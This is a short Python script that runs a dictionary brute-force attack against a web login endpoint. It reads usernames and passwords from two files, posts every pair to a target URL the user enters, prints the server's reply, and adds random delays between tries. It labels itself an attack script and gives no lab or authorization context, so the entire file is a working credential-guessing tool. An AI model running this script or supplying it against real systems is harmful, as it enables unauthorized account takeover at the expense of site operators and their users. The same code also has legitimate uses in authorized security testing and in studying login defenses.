import requests
import time
import random

# 🔗 Get base URL and auto-correct to include /login
base_url = input("Enter the target base URL : ").strip()
if not base_url.endswith("/login"):
    url = base_url.rstrip("/") + "/login"
else:
    url = base_url

# Files containing usernames and passwords
usernames_file = "usernames.txt"
passwords_file = "passwords.txt"

# Load from files
with open(usernames_file, "r") as u_file:
    usernames = [line.strip() for line in u_file]

with open(passwords_file, "r") as p_file:
    passwords = [line.strip() for line in p_file]

print("\n[*] Initiating brute-force attack...\n")

# Bruteforce loop
for username in usernames:
    for password in passwords:
        data = {"username": username, "password": password}
        try:
            response = requests.post(url, json=data)
            response.raise_for_status()
        except requests.exceptions.RequestException as e:
            print(f"[!] Error: {e}")
            continue

        print(f"[→] Trying: Username = '{username}', Password = '{password}'")
        print(f"    ↳ Server Response: {response.json().get('message', response.text)}")
        print("-" * 50)

        time.sleep(random.uniform(0.3, 0.7))

print("\n[✅] Attack script finished executing.")
